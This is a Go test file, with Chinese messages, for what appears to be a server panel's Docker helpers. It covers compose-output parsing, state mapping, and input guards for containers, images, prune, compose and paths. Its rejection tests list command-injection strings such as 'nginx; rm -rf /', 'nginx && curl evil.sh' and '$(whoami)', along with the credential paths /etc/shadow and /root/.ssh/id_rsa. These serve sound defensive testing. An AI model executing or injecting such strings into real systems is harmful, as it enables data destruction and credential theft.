package main

import "testing"

const composeTable = "NAME                IMAGE               COMMAND                  SERVICE   CREATED         STATUS                   PORTS\n" +
	"hsp-web-1           nginx:alpine        \"/docker-entrypoint.…\"   web       2 hours ago     Up 2 hours               0.0.0.0:8080->80/tcp\n" +
	"hsp-db-1            mysql:8             \"docker-entrypoint.s…\"   db        3 days ago      Exited (0) 5 hours ago   3306/tcp\n"

func TestParseComposePs(t *testing.T) {
	rows := parseComposePs(composeTable)
	if len(rows) != 2 {
		t.Fatalf("期望 2 行，实际 %d", len(rows))
	}
	if rows[0].Name != "hsp-web-1" {
		t.Errorf("NAME 错误: %q", rows[0].Name)
	}
	if rows[0].Service != "web" || rows[1].Service != "db" {
		t.Errorf("SERVICE 错位: %q / %q", rows[0].Service, rows[1].Service)
	}
	if rows[0].Status != "Up 2 hours" {
		t.Errorf("STATUS 未保留多词: %q", rows[0].Status)
	}
	if rows[0].Ports != "0.0.0.0:8080->80/tcp" {
		t.Errorf("PORTS 解析错误（末列被截断）: %q", rows[0].Ports)
	}
	if rows[1].Ports != "3306/tcp" {
		t.Errorf("PORTS 解析错误: %q", rows[1].Ports)
	}
	if rows[0].State != "running" || rows[1].State != "exited" {
		t.Errorf("STATE 推导错误: %q / %q", rows[0].State, rows[1].State)
	}
}

func TestParseComposePsEdge(t *testing.T) {
	if len(parseComposePs("")) != 0 {
		t.Error("空输入应返回空")
	}
	if len(parseComposePs("NAME  SERVICE")) != 0 {
		t.Error("仅表头应返回空")
	}
	if len(parseComposePs("   \n  \n")) != 0 {
		t.Error("空行应返回空")
	}
}

func TestParseComposeState(t *testing.T) {
	cases := map[string]string{
		"Up 3 hours":        "running",
		"Exited (0) 2 days": "exited",
		"Restarting (1) 5s": "restarting",
		"Created":           "created",
		"Paused":            "paused",
		"Dead":              "dead",
		"something else":    "unknown",
	}
	for in, want := range cases {
		if got := parseComposeState(in); got != want {
			t.Errorf("parseComposeState(%q) = %q, 期望 %q", in, got, want)
		}
	}
}

func TestContainerRefValidation(t *testing.T) {
	bad := []any{
		"nginx; rm -rf /",
		"nginx && curl evil.sh",
		"../../etc/passwd",
		"$(whoami)",
		"a b",
		"",
		"nginx`id`",
	}
	for _, v := range bad {
		if _, errMsg := validContainerRef(v); errMsg == "" {
			t.Errorf("应拒绝容器引用: %v", v)
		}
	}
	good := []string{"nginx", "hsp-web-1", "a1b2c3d4e5f6", "my_redis.1"}
	for _, v := range good {
		if _, errMsg := validContainerRef(v); errMsg != "" {
			t.Errorf("应接受容器引用 %q，却报错 %q", v, errMsg)
		}
	}
}

func TestImageRefValidation(t *testing.T) {
	bad := []any{"nginx; id", "", "nginx`x`", "nginx$(id)"}
	for _, v := range bad {
		if _, errMsg := validImageRef(v); errMsg == "" {
			t.Errorf("应拒绝镜像引用: %v", v)
		}
	}
	good := []string{"nginx", "nginx:alpine", "ghcr.io/home/panel:1.2.3"}
	for _, v := range good {
		if _, errMsg := validImageRef(v); errMsg != "" {
			t.Errorf("应接受镜像引用 %q，却报错 %q", v, errMsg)
		}
	}
}

func TestDockerPruneGuards(t *testing.T) {
	if _, ok := dockerPrune(map[string]any{"target": "volume"})["error"]; !ok {
		t.Error("volume prune 未要求 confirm")
	}
	if _, ok := dockerPrune(map[string]any{"target": "banana"})["error"]; !ok {
		t.Error("非法 target 未被拒绝")
	}
}

func TestDockerComposeGuards(t *testing.T) {
	cases := []map[string]any{
		{},                                       // 缺 file
		{"file": "/root/x.conf", "action": "up"}, // 非 yml
		{"file": "/root/x.yml", "action": "exec"},                 // 非法动作
		{"file": "/System/x.yml", "action": "up"},                 // 白名单外
		{"file": "/root/x.yml", "action": "up", "service": "a b"}, // 非法服务名
	}
	for i, c := range cases {
		if _, ok := dockerCompose(c)["error"]; !ok {
			t.Errorf("用例 %d 应返回错误: %v", i, c)
		}
	}
}

func TestSafePathStillWorks(t *testing.T) {
	if _, errMsg := safePath("/etc/shadow"); errMsg == "" {
		t.Error("/etc/shadow 应被拒绝")
	}
	if _, errMsg := safePath("/root/.ssh/id_rsa"); errMsg == "" {
		t.Error("/root/.ssh/id_rsa 应被拒绝")
	}
	if _, errMsg := safePath("/tmp"); errMsg != "" {
		t.Errorf("/tmp 应被允许，却报错 %q", errMsg)
	}
}
